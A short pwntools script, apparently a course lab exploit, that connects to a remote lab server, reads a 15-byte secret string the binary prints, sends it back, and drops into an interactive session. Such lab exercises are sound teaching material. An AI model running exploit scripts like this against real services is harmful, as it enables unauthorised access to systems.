from pwn import *

''' Establish Connection to Server '''
# Create Process Object
# p = process("./1-1_lab.bin")              # Uncomment to Test Script Locally
p = remote("csc748.hostbin.org", 7011)      # Test Script Against Server

''' Obtain Secret String '''
p.readuntil(b"\n\n")        # Read until the Second Newline Char
s = p.read(15)              # Read 15 bytes of Secret String
print(f"Secret String: {s}")    # Print Secret String

''' Exploit Vulnerability '''
p.sendline(s)               # Send Secret String to process
p.interactive()             # Start an interactive session
